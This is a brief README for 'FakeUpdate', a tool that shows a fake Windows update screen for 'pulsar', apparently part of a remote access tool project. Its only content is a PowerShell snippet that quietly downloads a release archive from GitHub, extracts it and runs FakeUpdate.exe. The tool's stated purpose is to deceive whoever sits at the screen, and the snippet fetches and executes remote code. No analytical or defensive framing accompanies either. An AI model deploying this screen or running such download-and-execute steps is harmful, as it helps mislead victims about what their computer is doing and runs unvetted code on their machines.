# FakeUpdate

Fake windows update screen for pulsar.

```powershell
$ProgressPreference = 'SilentlyContinue'
irm https://github.com/Quasar-Continuation/FakeUpdate/releases/download/AutoBuild/build_output.zip -OutFile out.zip
$ProgressPreference = 'Continue'
Expand-Archive out.zip
Remove-Item out.zip
cd out
FakeUpdate.exe
```
